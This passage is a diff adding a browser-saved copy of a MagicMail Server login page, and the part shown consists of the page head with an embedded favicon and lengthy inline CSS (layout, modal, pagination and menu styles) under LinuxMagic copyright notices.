@@ -1,0 +1,2760 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head>
+<link rel="icon" data-savepage-href="https://mail.rconnects.com/favicon.ico" href="data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAC4jAAAuIwF4pT92AAAABGdBTUEAALGOfPtRkwAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAACoElEQVR42mL8//8/AyUAIICYGCgEAAHE0tTUfk2e/4usDM+rPz//sjEwgkQZGRlALmNEooEMBpBbmYBMVqY/DPc+SbA8+8T+GCCAWIAy/L+YBHk0JE4ySAsdZ2D4B3MURBOMyQDzKdN/hpsvPRmuf1JnYGH6yQ8QQEzv3rz8v2nXEYZ1t7wYHn5yYmDg+M7AwMYDxFwMDOwgmhtoJRCzAzHnd4Yb74IY1l4zYdi6ey/D9+9f/gMEEAsLCyvDrl3bGL59+8bAzubD4MH2n0FOfCsDw19xoHX/oNYDAfNLhhuPoxi23zRmWL12McOTJ48YLEzNGAACiIWJmYmBi4ubYd++3Qwc7BxA9e4MnuwMDLLSQEP+iEFD6iXD7fsRDDuvmjOsWb+G4cL5swxycnJgfwEEEAsTMICYWVjA6rZt38zwH2jh79+ODL4sQJcobAOL37oZxrDljClQ82qG48eOgMVAgfv/338GgABiATkRZAgMsLEwMvz5x8Ww5YQjQxDXF4av33kYdp61BNrFBHQhK1zdf2joAgQQC0jvv3//wFxfHx8GTw8vBlc3Z4a/f5kZ1u0Ehh0bB0NAUBDD29fPGViY/wMxM8PuPXuA8n/BwQMQQCxAVzD8/PmTwcHBgcHHy4fB2cWJQUlZBWwgD08MAzNQg5i4KIOsnBTDr1+/wOI/gOqvXLkKthgggFj+AU1ysHdgcHVxZXBxdWZQUlGB+A+IJaUkwBpACkGJyczSkgFk4a+fvxhEhIUZ/vz5wwAQQCy8vHyMvl7eDNZ2tgw8/AIML1+9hvuTEZaAkNKUspoq2CXswPD48vUbI0AAsQBt+vjv/3++i+cv/AGZyIAUoLDQZkQWA/KZWZhBFMufv/8+AgQQI6W5ESCAKM6NAAEGACcb6fG/dzZGAAAAAElFTkSuQmCC">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>
+    MagicMail Server: Login Page    </title>
+    <style data-savepage-href="css/wizard.css?mtime=1744239724" type="text/css">/* -----------------------------------------------------------------------
+
+ Wizard CSS (2.1) Framework
+ http://www.wizard.ca
+
+ Copyright: 2010-2019 Wizard IT Services, All Rights Reserved
+ All style attributes in alpha-numeric order starting from 0
+
+----------------------------------------------------------------------- */
+
+/* Reset styles */
+*{outline:medium none}a,abbr,acronym,address,blockquote,body,caption,code,dd,del,dfn,dl,dt,em,fieldset,form,div,h1,h2,h3,h4,h5,h6,html,iframe,img,label,legend,li,object,ol,p,pre,q,span,table,tbody,td,tfoot,th,thead,tr,ul{border:0;font-family:inherit;font-size:100%;font-style:inherit;font-weight:inherit;margin:0;padding:0;vertical-align:baseline}table{border-collapse:separate;border-spacing:0;}caption,th,td{text-align:left;font-weight:normal}table,td,th{vertical-align:middle}a{cursor:pointer}a img{border:none}blockquote:before,blockquote:after,q:before,q:after{content:""}blockquote,q{quotes:"" ""}
+
+/* Quick styles */
+.left { float: left; }
+.right { float: right; }
+
+.textleft { text-align: left; }
+.textright { text-align: right; }
+.textcenter { text-align: center; }
+.textjustify { text-align: justify; }
+
+.green { color: #4E9113; }
+.orange { color: #CE680E; }
+.red { color: #BA0A0A; }
+
+/* Layout */
+body {
+    background: #FFF;
+    color: #222;
+    font-family: "Helvetica Neue", Arial, Helvetica, sans-serif;
+    font-size: 12px;
+    line-height: 125%
+}
+
+/* Forms */
+input[type=text],
+input[type=email],
+input[type=password],
+textarea, select {
+    background:#FFF;
+    border:1px solid #999;
+    border-radius:3px;
+}
+
+input[type=text]:focus,
+input[type=text]:focus,
+input[type=password]:focus,
+textarea:focus,
+select:focus {
+    background: #FFF6DF;
+    border-color: #666;
+}
+
+input[type=text],
+input[type=text],
+input[type=password],
+textarea,
+select {
+    margin: 0.5em 0;
+}
+
+input[type=checkbox],
+input[type=radio] {
+    cursor: pointer;
+    margin: 0;
+    -moz-border-bottom-colors: #999 #FFF;
+    -moz-border-left-colors: #999 #FFF;
+    -moz-border-right-colors: #999 #FFF;
+    -moz-border-top-colors: #999 #FFF;
+    position: relative;
+    top: 1px
+
+}
+
+.error,.notice,.success,.warning{border:1px solid #DDD;margin-bottom:1em;padding:.8em;border-radius:8px;text-align:center}
+
+
+/* This is what Evgueni wants and other CSS frameworks use 
+.success{background:#E6EFC2;border-color:#C6D880;color:#264409}
+.error{background:#FBE3E4;border-color:#FBC2C4;color:#8A1F11} */
+
+/* This is what Michael wants */
+.success{background:#8CEF8C;border-color:#008A00;color:#000}
+.error{background:#FFCFD6;border-color:#9C0000;color:#000}
+.warning{background-color: #E1BA00;border-color:#C7A502;color:#000;}
+
+.notice{background:#FFF6BF;border-color:#FFD324;color:#514721}
+.error a{color:#8A1f11}
+.notice a{color:#514721}
+.success a{color:#264409}
+
+.main_wiz {
+    font: 12px Verdana, Arial, Helvetica, sans-serif;
+    max-width: 690px;
+}
+
+</style>
+<style data-savepage-href="css/magicmail.css?mtime=1744239724" type="text/css">/*
+ * COPYRIGHT INFORMATION - DO NOT REMOVE
+ *
+ * Copyright (c) LinuxMagic Inc. 2010-2020 All Rights Reserved
+ *
+ * This file contains Original Code as created by LinuxMagic Inc.
+ *
+ * The Original Code is distributed on an 'AS IS' basis,
+ * WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, AND LINUXMAGIC
+ * HEREBY DISCLAIMS ALL SUCH WARRANTIES, INCLUDING WITHOUT LIMITATION, ANY
+ * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, QUIET
+ * ENJOYMENT OR NON-INFRINGEMENT.
+ *
+ * Do NOT download, distribute, use or alter this software or file in any
+ * way without express written permission from LinuxMagic Inc. or its parent
+ * company Wizard Tower TechnoServices signed by an authorized company officer.
+ *
+ * Author(s): Unknown
+ *            Steven Hall <stevenh@linuxmagic.com>
+ *            Arturo Gamez Ortega <arturo@linuxmagic.com>
+ *
+ * $Id: magicmail.css 45918 2023-04-10 17:48:02Z shaun $
+ */
+
+/*savepage-import-url=modal.css*//* The Modal (background) */
+.mm-modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    padding-top: 100px; /* Location of the box */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+/* Modal Content */
+.mm-modal-content {
+    background-color: #fefefe;
+    margin: auto;
+    border: 1px solid #888;
+    width: 40%;
+    min-width: 670px;
+    overflow: scroll;
+}
+
+/* The Close Button */
+.mm-modal-close {
+    color: #aaaaaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.mm-modal-content {
+    border: 1px solid black;
+}
+
+.mm-modal-body {
+    padding: 10px;
+}
+
+.mm-modal-footer {
+    background-color: #eee;
+    padding: 10px;
+    text-align: right;
+}
+.mm-modal-header {
+    padding: 10px;
+    background-color: #eee;
+}
+
+.mm-modal-msg {
+    display: hidden;
+    padding: 10px;
+}
+
+.mm-modal-body ul {
+	padding-left: 11px;
+	font-size: 14px;
+}
+
+.mm-modal-close:hover,
+.mm-modalclose:focus {
+    color: #000;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.mm-modal-footer button {
+    position: relative;
+}
+
+#uncaught-spam-folder-modal .folder-content {
+    text-align: center;
+    font-size: 13px;
+}
+
+#uncaught-spam-folder-modal .folder-content {
+    text-align: center;
+    font-size: 13px;
+}
+
+/* Specific to admin interface, user.php */
+.mm-modal-header h2 {
+    margin-top: 6px;
+    margin-bottom: 2px;
+}
+
+/*savepage-import-url=pagination.css*//*
+ * COPYRIGHT INFORMATION - DO NOT REMOVE
+ *
+ * This file is part of the MagicMail (TM) Project and is
+ * Copyright (c) LinuxMagic Inc. 2019 All Rights Reserved
+ *
+ * This file contains Original Code as created by LinuxMagic Inc.
+ *
+ * The Original Code is distributed on an 'AS IS' basis,
+ * WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, AND LINUXMAGIC
+ * HEREBY DISCLAIMS ALL SUCH WARRANTIES, INCLUDING WITHOUT LIMITATION, ANY
+ * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, QUIET
+ * ENJOYMENT OR NON-INFRINGEMENT.
+ *
+ * Do NOT download, distribute, use or alter this software or file in any
+ * way without express written permission from LinuxMagic Inc. or its parent
+ * company Wizard Tower TechnoServices signed by an authorized company officer.
+ *
+ * Author(s): Steven Hall <stevenh@linuxmagic.com>
+ *
+ * $Id:
+ */
+
+.pageLinks {
+    text-align: center;
+}
+form.pageLinks {
+    margin-top: 10px;
+}
+.pageLinkDigit {
+    color: #666;
+    text-align: center;
+}
+
+.pageLinks div,
+.pageLinks select,
+.pageLinks input {
+    border: 1px solid #ccc;
+    background: -moz-linear-gradient(top, #f7f7f7 0%, #e7ebe7 50%, #efebef 100%);
+    background: -webkit-linear-gradient(top, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    background: linear-gradient(to bottom, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f7f7f7', endColorstr='#efebef',GradientType=0 );
+    width: 30px;
+    box-sizing: border-box;
+    display: inline-block;
+    line-height: 21px;
+}
+
+.pageLinks select,
+.pageLinks input {
+    width: auto;
+}
+
+.pageLinks div:hover a,
+.pageLinks select:hover,
+.pageLinks input:hover {
+    background: -moz-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    background: -webkit-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E6E6E6', endColorstr='#B8B8B8',GradientType=0 );
+    background: linear-gradient(to bottom, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+}
+
+.pageLinkDigit:hover {
+    background: -moz-linear-gradient(top, #f7f7f7 0%, #e7ebe7 50%, #efebef 100%);
+    background: -webkit-linear-gradient(top, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    background: linear-gradient(to bottom, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f7f7f7', endColorstr='#efebef',GradientType=0 );
+}
+
+.pageLinks div:first-child {
+    -webkit-border-top-left-radius: 3px;
+    -webkit-border-bottom-left-radius: 3px;
+    -moz-border-radius-topleft: 3px;
+    -moz-border-radius-bottomleft: 3px;
+    border-top-left-radius: 3px;
+    border-bottom-left-radius: 3px;
+    width: 45px;
+}
+
+
+.pageLinks div:last-child  {
+    -webkit-border-top-right-radius: 3px;
+    -webkit-border-bottom-right-radius: 3px;
+    -moz-border-radius-topright: 3px;
+    -moz-border-radius-bottomright: 3px;
+    border-top-right-radius: 3px;
+    border-bottom-right-radius: 3px;
+    width: 45px;
+}
+
+div.selectedPage {
+    background: -moz-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    background: -webkit-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E6E6E6', endColorstr='#B8B8B8',GradientType=0 );
+    background: linear-gradient(to bottom, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    font-weight: bold;
+    color: #10456b;
+    width: 30px;
+    box-sizing: border-box;
+    text-align: center;
+}
+
+.pageLinkDigit a {
+    box-sizing: border-box;
+    color: #10456b;
+    display: inline-block;
+    text-decoration: none;
+    width: 100%;
+}
+
+select.pageLinkDigit,
+input.pageLinkDigit {
+    box-sizing: border-box;
+    color: #10456b;
+    display: inline-block;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.selectedPage {
+    line-height: 25px;
+}
+
+
+/* Quick Styles */
+a {
+    color: #10456B;
+}
+
+a:hover {
+    color: #000;
+}
+
+.muddyAqua {
+    color: #18598B;
+}
+
+/* Header FONT sizes SHOULD be relative sizing */
+h2 {
+    color: #10456B;
+    font-size: 150%;
+    font-weight: bold;
+    margin: 0 0 8px;
+}
+
+h3 {
+    color: #343434;
+    font-size: 1.2em;
+    font-weight: bold;
+    margin: 4px 0;
+}
+
+.minibutton {
+    background: #FFF;
+    border: 1px solid #999;
+    display: inline-block;
+    -moz-border-radius: 3px;
+    padding: 1px;
+    -webkit-border-radius: 3px;
+}
+
+.minibutton a {
+    background: #DEDEDE /*savepage-url=../pics/background-mailboxheader.gif*/ url() repeat-x;
+    color: #343434;
+    cursor: pointer;
+    display: block;
+    font-size: 11px;
+    padding: 1px 6px;
+    text-align: center;
+    text-decoration: none;
+    white-space: nowrap;
+}
+
+.minibutton a:hover {
+    background: #FFF /*savepage-url=../pics/background-mailbox.gif*/ url() repeat-x top left;
+}
+
+/* Only used in Admin Interface, but logical to be the same across the board */
+.helpLink {
+    padding-right: 10px;
+    float: right;
+}
+
+/* Probably be considered for wizard.css */
+td.success {
+    border: 2px solid #008800 !important
+}
+
+td.error {
+    border: 2px solid #990000 !important;
+}
+
+/* Used in admin, portal, and js */
+td.folderName > div {
+    overflow: hidden;
+    white-space: nowrap;
+    text-overflow: ellipsis;
+    max-width: 317px;
+    display: inline-block;
+    line-height: 25px;
+}
+
+/* table row number is even */
+/* MP: We can deprecate now, using nth-child instead */
+tr.even {
+    background: #dedfde none repeat scroll 0 0;
+}
+
+/* Standard MagicMail Layout Items*/
+/* In general, only used to set body background, and page sizing */
+.MagicBody {
+    background: #A5AAAD /*savepage-url=../pics/pagebackground.gif*/ var(--savepage-url-12) repeat-x;
+    padding-top: 27px;
+
+    /* Deprecate, if you need this, better on body tag */
+    text-align: center;
+}
+
+.inpopup {
+    margin-left: 50px;
+}
+
+/* We want to use standard font classes, but this is a workaround */
+/* This should inherit from the MagicBody, but since it doesn't
+   always, you can use this in a table or div section */
+.MagicStandardFont {
+   font-family: 12px Verdana, Tahoma, Arial, sans-serif !important;
+}
+
+/* Normally we float this in the center, and 30 pixels from the top, 10 pixels from the bottom */
+#MagicWrapper {
+    margin: 0 auto 0 auto;
+    text-align: left;
+    position: relative;
+    height: 100%;
+}
+
+.MagicOuterTable {
+    /* border-spacing: 0; inherited from wizard.css */
+    /* border-collapse: collapse; inherited from wizard.css */
+    /* If you want a seperated footer, use the border on the first child */
+    border-collapse: separate;
+    border: 2px solid #424542;
+    width: 1000px;
+    height: 100%;
+    margin: 0 auto 0 auto;
+}
+
+/* Set Blue Curved Background over the grey gradient background on parent */
+/* This should be moved to css.css as it only applies to admin interfaces */
+#MainHeaderTable tr:first-child {
+    background: /*savepage-url=../pics/blue_curve_top.svg*/ url() no-repeat;
+}
+
+/* Only problem with the technique above, is that every child table
+   will try also to set that as a background. Override for child tables */
+#MainHeaderTable tr:first-child table tr:first-child {
+    background: none;
+}
+
+/* End Admin Only */
+.MagicOuterTable tr:first-child {
+    /* border: 4px solid #424542; */
+    height: 100%;
+}
+
+.MagicOuterTable td {
+    vertical-align: top; /* Override Wizard Behavior */
+}
+
+.MagicContentTable {
+    border-collapse: collapse;
+    border-spacing: 0;
+    background: /*savepage-url=../pics/blue_curve_body.svg*/ url() no-repeat, linear-gradient(#FFF, #e6e7e8);
+    width: 100%;
+    margin: 0;
+    padding: 0;
+    font-family: Verdana, Tahoma, Arial, sans-serif !important;
+
+    /* Ugly way to do this.. Since you need to change the amount you subtrack everytime the header changes
+       but this will allow the table to expand to the full size of the parent */
+    height: calc(100% - 119px);
+}
+
+/* This may replace MagicContent, same as #EmailOptions from user interface */
+#MagicMailDataDiv {
+    line-height: 150%;
+    margin: 0 8px 0 auto;
+    width: 100%
+}
+
+/* Legacy, but useful for tables that are NOT data tables */
+/* MP: Of course,we can slowly move these to flex divs */
+/* Moved from the admin interface specific css */
+/* MP: They conflicted, we need this in global only */
+table.MagicEmbeddedTable {
+    max-width: 690px;
+    border: 1px solid #aaa;
+    background-color: #ffffff;
+    font-family: Verdana, Arial, Helvetica, sans-serif;
+    font-size: 12px;
+}
+
+table.noBorder {
+    border: 0px;
+}
+
+table.multiListHolder {
+    width: 100%;
+}
+
+table.multiListHolder tr td div.multiListTitle {
+    text-align: left;
+    margin-left: 24px;
+    font-weight: bold;
+}
+
+table.MagicEmbeddedTable .multiListHolder td {
+    text-align: center;
+}
+
+table.MagicEmbeddedTable .multiListHolder td.multiListMiddleButtons {
+    vertical-align: middle;
+}
+
+.MagicEmbeddedTable th {
+    background: #EFEFEF;
+    border-bottom: 1px solid #AAA;
+    height: 25px;
+    /* padding-left: 10px; No need fo this */
+}
+
+/* Don't know if this is needed everywhere */
+table.MagicEmbeddedTable td.MagicLoginInfo {
+    word-break: break-all;
+}
+
+table.MagicEmbeddedTable tr {
+    /*
+     * ie8 centres content of cells otherwise.
+     * for instance see appearance of single account manage page without this.
+     */
+    text-align: left;
+}
+
+table.MagicEmbeddedTable th {
+    /* Should be in Embedded Table Definition */
+    background-color: #EFEFEF;
+    border-bottom: 1px solid #ADAAAD;
+    font-size: 14px;
+    /* we text-align: left rows, but want headers to be centred */
+    text-align: center;
+}
+
+table.MagicEmbeddedTable th a {
+    font-weight: bold;
+    text-decoration: none;
+    font-size: 12px;
+    color: #10456B;
+}
+
+table.MagicEmbeddedTable th a:hover {
+    color: #000;
+}
+
+table.MagicEmbeddedTableHeader {
+    /* Should be in Embedded Table Definition */
+    background-color: #efefef;
+    border-bottom: #aaa 1px solid;
+}
+
+table.MagicEmbeddedTable .error {
+    text-align: center;
+    border: 2px #990000 solid;
+    background-color: #FFCCD7;
+    font-weight: bold;
+}
+
+table.MagicEmbeddedTable .success {
+    text-align: center;
+    background-color: #88EE88;
+    border: 2px solid #008800;
+    font-weight: bold;
+}
+
+table.MagicEmbeddedTable .header {
+    background-color: #afafaf;
+    color: white; font-weight: bold;
+    padding: 2px; text-align: center;
+}
+
+table.MagicEmbeddedTable .entry {
+    border-left: 1px solid #afafaf;
+    padding-left: 4px;
+}
+
+table.MagicEmbeddedTable .entryAlt {
+    border-left: 1px solid #afafaf;
+    padding-left: 4px;
+}
+
+/*
+ * TODO: these tables should be converted to MagicDataTable, but for now to
+ * consolidate alt rows I apply this rule
+ * TODO: Eventually can move to divs, now that display: flex is available for
+ * layout
+ */
+table.MagicEmbeddedTable tr.even,
+table.MagicEmbeddedTable td.even {
+    background: #dedfde;
+}
+
+table.MagicEmbeddedTable td.MagicSettingsLabel {
+    width: 350px;
+    height: 32px;
+}
+
+table.MagicEmbeddedTable td.MagicSettingsInput {
+    width: 160px;
+    height: 32px;
+}
+
+table.MagicEmbeddedTable td.MagicSettingsHelp {
+    width: 40px;
+    height: 32px;
+}
+
+table.MagicEmbeddedTable td.MagicLoginInfo {
+
+    word-break: break-all;
+}
+
+.MagicCompanyFooter td,
+.MagicCopyRight  td {
+    font-size: 11px;
+    line-height: 1.3em;
+    text-align: center;
+}
+
+.MagicCompanyFooter {
+    background-color: #f0f1f2;
+}
+
+.MagicCopyRight {
+    background-color: #18598B;
+    color: #FFF;
+}
+
+.MagicCopyRight p {
+    margin: 10px 0 5px;
+}
+
+/* Header, from /usr/share/magicmail/php/html_files/EN/header_style1.html */
+#MainHeaderTable {
+    background-image: linear-gradient(#fefefe, #e6e7e8);
+    border-spacing: 0;
+    border-collapse: collapse;
+    height: 104px;
+    width: 100%;
+}
+
+#MainHeaderTable table {
+    float: right;
+}
+
+/* New MagicMail_logo_white is 283px × 75px */
+#MMLogo {
+    height: 77px;
+    padding-left: 30px !important;
+    padding-top: 14px !important;
+}
+
+/* New Image, Your Company Logo (PNG) is 276pxx66px */
+#HeaderLogo {
+    height: 77px;
+    vertical-align: top;
+    padding: 10px 10px 0px 0px !important;
+}
+
+/* MP: Fix this method, we can do better than this.. */
+#MainHeaderTable td {
+    padding: 0px;
+    margin: 0px;
+}
+
+#MainHeaderTable td.nopad a.nopad {
+    float: right;
+    margin: -1px 0 0;
+}
+
+#MainHeaderTable td.nopad a:hover.nopad {
+    cursor: pointer;
+    filter: alpha(opacity=80);
+    opacity: 0.8;
+}
+
+/* Admin Interface specific */
+.CustomHeaderTable {
+    background: #FFF /*savepage-url=./pics/1px_black_top.png*/ url() repeat-x top left;
+    border: 0;
+    height: 104px;
+    margin: 0;
+    padding: 0;
+    width: 100%;
+}
+
+.CustomHeaderTable td {
+    margin: 0;
+    padding: 0;
+    font-size: 0; /* IE Fix */
+}
+
+#AdminSubHeaderRow {
+    background: #FFF /*savepage-url=../pics/1px_grey_top.png*/ url() repeat-x;
+}
+
+/* Merge the two names below? */
+#MainHeaderSubMenu {
+    background: /*savepage-url=../pics/background-sub.gif*/ url() no-repeat;
+    font-size: 10px;
+    height: 20px;
+}
+
+#CustomHeaderSubMenu {
+    text-align: right;
+    padding-top: 1px;
+    background: /*savepage-url=../pics/sub_menu_left.png*/ url() no-repeat;
+    font-size: 11px;
+    line-height: 1.5em;
+}
+
+/* Smaller table to hold company logo, and login/help buttons in header, floats right */
+#header-table {
+    border-spacing: 0;
+    border-collapse: collapse;
+}
+
+#header-table td {
+    text-align: right !important;
+    padding: 0px;
+    margin: 0px;
+}
+
+/*Logout button*/
+.MagicNavTab {
+    background-color: #555855;
+    border-radius: 8px 8px 0px 0px;
+    overflow: hidden;
+    width: 100px;
+    height: 28px;
+    text-align: center;
+    vertical-align: bottom;
+    font-size: 1.4em;
+    color: #FFF;
+    float: right;
+}
+.MagicNavTab a {
+    color: #FFF;
+    transition: .2s;
+    text-decoration: none;
+    display: flex;
+    width: 100%;
+    height: 100%;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Think this is only used in admin interface now, but keep around */
+#MainHeaderSubMenu a {
+    color: #000;
+}
+
+#MainHeaderSubMenu a:hover {
+    color: #10456B;
+}
+
+/* Admin Interface, this is called AdminSubHeaderRow */
+#UserSubHeaderRow {
+    background: #FFF /*savepage-url=../pics/1px_grey_top.png*/ url() repeat-x;
+}
+
+#MainHeaderSubMenu {
+    text-align: right;
+    padding-top: 1px;
+    background: /*savepage-url=../pics/sub_menu_left.png*/ url() no-repeat;
+    font-size: 11px;
+    line-height: 1.5em;
+}
+
+/* This is what it is called in the admin interface */
+.MagicLeftMenuCell {
+    background: /*savepage-url=../pics/clearleft_menu_1px.png*/ url() repeat-y top left;
+    margin: 0;
+    padding: 10px 0px 15px 25px;
+    min-height: 300px;
+    width: 200px;
+    font: 12px Verdana, Arial, Helvetica, sans-serif !important;
+}
+
+#loggedinas {
+    background: #FFF;
+    border: 2px solid #10456B;
+    font-size: .9em;
+    overflow: hidden;
+    text-align: center;
+    padding: 6px;
+    width: 160px;
+}
+
+#loggedinas strong {
+    color: #10456B;
+}
+
+.sideerror {
+    background: #FFF;
+    border: 2px solid #A00;
+    color: #840000;
+    font-weight: bold;
+    margin: 13px 0;
+    text-align: center;
+    width: 175px;
+    font-size: 0.9em;
+    padding: 4px !important;
+}
+
+/* Main Menu, common to Admin and User Interfaces */
+#MagicMenu {
+    width: 200px;
+}
+
+/* MP: Why is this here? */
+#Sidebar h4 em {
+    display: none;
+}
+
+#MagicMenu ul {
+    list-style: none;
+    margin-left: 5px;
+}
+
+#MagicMenu ul li {
+    border-bottom: 1px solid #AAA;
+    color: #000;
+    margin: 0;
+    padding: 0;
+    text-decoration: none;
+}
+
+#MagicMenu ul > li {
+    height: auto;
+}
+
+/* Deprecated, but might be useful in the future */
+#MagicMenu .dash {
+    display: none;
+}
+
+#MagicMenu ul li a {
+    color: #000;
+    display: block;
+    height: 26px;
+    line-height: 26px;
+    padding-left: 25px;
+    text-decoration: none;
+    min-height: 18px;
+}
+
+#MagicMenu ul li a:hover {
+    background-color: #EEE;
+    color: #10456B;
+}
+
+#MagicMenu ul.subMenu li {
+    border-bottom: 0;
+}
+
+#MagicMenu ul.subMenu li:not(:first-child) {
+    border-top: 1px solid #AAA;
+}
+
+#MagicMenu ul.subMenu .dash {
+    display: none;
+}
+
+/* hide image backgrounds for submenu items */
+#MagicMenu ul.subMenu li a, #MagicMenu ul.SubMenu li a:hover {
+    background: none;
+}
+
+#MagicMenu ul.subMenu li a {
+    color: #444;
+    display: block;
+    height: 20px;
+    line-height: 20px;
+    padding: 0 0 0 23px;
+    margin: 0;
+    font-size: 11px;
+    text-decoration: none;
+}
+
+#MagicMenu ul.subMenu a:hover {
+        color: #10456B;
+}
+
+#MagicMenu ul.subMenu li.active a {
+    color: #10456B;
+}
+
+/* Only used in admin, but logical to have same behavior across the board */
+.selectedMenuItem {
+    color: #498AB2 !important;
+}
+
+.selectedMenuItem:hover {
+    color: #10456B!important;
+}
+
+/* Spam Count, Only used in the login page */
+#MagicSpamCount {
+    width: 174px;
+}
+
+p#HelpMsg {
+    background: #999;
+    color: #FFF;
+    font-size: 0.9em;
+    margin: 0px;
+    padding: 6px;
+    text-align: center;
+}
+
+p#HelpMsg:hover {
+    cursor: help;
+}
+
+#MagicSpamCount #MailSummary {
+    background: #F2F2F2;
+    border: 1px solid #444;
+    margin: 15px auto 0;
+    width: 100%;
+}
+
+#MailSummary h4 {
+    background: #999;
+    border-bottom: 1px solid #555;
+    border-top: none;
+    color: #FFF;
+    font-weight: bold;
+    margin: 0;
+    padding: 3px;
+    text-align: center;
+    font-size: 10pt;
+}
+
+#MailSummary p {
+    font-size: 12px;
+    margin: 5px;
+    text-align: center;
+}
+
+#MailSummary p span {
+    display: block;
+    margin: .5em 0;
+}
+
+/* Powered By */
+#PoweredBy {
+    margin: 8px 0;
+    text-align: center;
+    width: 175px;
+}
+
+/* Page Content */
+.MagicContentCell {
+    background-color: #ffffff;
+    padding-left: 0;
+    padding: 15px 15px 15px 20px;
+    text-align: left;
+}
+
+.MagicContentCell {
+    vertical-align: top;
+}
+
+.MagicContentCell p {
+    margin: 8px 0;
+}
+
+.MagicContentCell .main_wiz p,
+.MagicContentCell p {
+    font-size: 1.2em;
+}
+
+#Promo {
+    margin: 40px auto 20px;
+}
+
+/* MP: Is this even used any more? Maybe Admin */
+#Footer {
+    width: 100%;
+    margin: 20px auto 0;
+    padding-top: 10px;
+    clear: both;
+    border-top: solid 1px #cdcdcd;
+    background-color: #18598B;
+}
+
+.SubmitButton {
+    margin-top: 10px;
+    text-align: right;
+}
+
+/* used with the printNoticePage function, functions.php */
+.pagenotice {
+    background: #FFF;
+    border: 2px solid red;
+    padding: 1em;
+}
+
+.pagenotice br {
+    display: none;
+}
+
+/* tooltip 'hover' stuff. */
+.Tooltip {
+    background: #FCFCFC;
+    border: 1px solid #DDD;
+    filter: alpha(opacity=90);
+    font-size: 12px;
+    line-height: 18px;
+    width: 250px;
+    -moz-border-radius: 5%;
+    -moz-opacity: 0.90;
+    padding: 10px;
+    text-align: left;
+    display: none;
+    z-index: 99;
+}
+
+p.Tooltip {
+   background-color: #ffffb3;
+   border: 1px solid #dddddd;
+   border-radius: 5%;
+   color: #222;
+   display: none;
+   font-size: 12px;
+   line-height: 1.2em;
+   margin: 0;
+   padding: 10px !important;
+   white-space: normal;
+   width: 250px;
+   text-align: center;
+   z-index: 10;
+}
+
+/* Used in admin and user interface */
+.MagicEmailList {
+    word-break: break-all;
+    word-wrap: break-word;
+    padding-right: 20px;
+}
+
+/* styles from admin/magicmail.css */
+/* MP MagicDataTable is for stacking tables, slowly being replaced by divs' */
+/* Only used in the user interface in the following:
+   modules/quarantine.php
+   js/forgot_password.js
+   Heavily used in the admin interface
+*/
+
+table.MagicDataTable {
+    border: 1px solid #999;
+    border-spacing: 0px;
+    border-radius: 4px;
+    -moz-border-radius: 4px;
+    -webkit-border-radius: 4px;
+    margin-bottom: 8px !important;
+    padding: 0;
+    width: 100% !important;
+    overflow: hidden;
+}
+
+table.MagicDataTable tr {
+    min-height: 1.1em;
+}
+
+/* The following is legacy, Bryan suggests that we make it look differently */
+table.MagicDataTable tr.header {
+    border-bottom: 1px solid #999;
+    color: #343434;
+    padding: 0;
+}
+
+/*
+ * extra_icon_space is a specific class for the domains list 
+ * to add icons depending their status 
+ */
+table.extra_icon_space tbody .hosted_domain td:last-child {
+    min-width: 161px;
+    white-space: nowrap;
+}
+table.extra_icon_space tbody .hosted_domain td:last-child .health_icon {
+    background: /*savepage-url=../pics/unknown_health_icon.png*/ url();
+    background-size: 100%;
+}
+table.extra_icon_space tbody .hosted_domain td:last-child .alert_icon {
+    background: /*savepage-url=../pics/icon-warning.png*/ url();
+    background-size: 100%;
+}
+table.extra_icon_space tbody .hosted_domain td:last-child span {
+    background-size: 100%;
+    width: 13px;
+    height: 11px;
+    display: inline-block;
+    background-repeat: no-repeat;
+    margin-left: 5px;
+    position: relative;
+    top: 2;
+}
+
+/* We can do that by setting the th header class as follows:
+   Only problem, we have to get rid of hard coded per table
+   rules currently in place, eg #EmailOptions */
+table.MagicDataTable tr.header th {
+    text-align: center;
+    height: 30px;
+    font-size: 1.1em;
+    font-weight: bold;
+    line-height: 1.3em;
+    vertical-align: bottom;
+    padding-bottom: 5px;
+    color: #00567b;
+    background-image: linear-gradient(to bottom, #FFF, #e6e7e8);
+}
+
+/* This is to replace the use of ul's in table headers,
+   and replace with
